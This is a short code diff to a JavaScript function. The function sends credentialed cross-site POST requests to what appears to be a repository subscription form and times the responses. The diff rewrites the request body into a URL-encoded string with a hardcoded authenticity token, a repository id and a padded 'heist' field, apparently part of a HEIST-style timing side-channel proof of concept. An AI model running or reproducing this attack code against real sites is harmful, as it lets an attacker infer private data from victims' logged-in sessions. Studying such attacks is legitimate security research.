@@ -34,13 +34,7 @@ function fetchUrl(site, payloadSize) {
     redirect: 'manual',
     cache: 'no-cache',
     credentials: 'include',
-    body : new FormData({
-      utf8:'%E2%9C%93',
-      authenticity_token:'6nletYfGcKgnquE9UnR9IDGq13WZb7WgAQ8XoltMyXLrcoMUdYYfopfSKtTdKT87WHzu%2BrwUEThgqFbXCjBD8A%3D%3D',
-      repository_id:'64934908',
-      do:'included',
-      heist: generatePayload(8000)
-    })
+    body : 'utf8=%E2%9C%93&authenticity_token=6nletYfGcKgnquE9UnR9IDGq13WZb7WgAQ8XoltMyXLrcoMUdYYfopfSKtTdKT87WHzu%2BrwUEThgqFbXCjBD8A%3D%3D&repository_id=64934908&do=included&heist='+generatePayload(8000)
   })
   .then(function(result){
     T1 = performance.now();
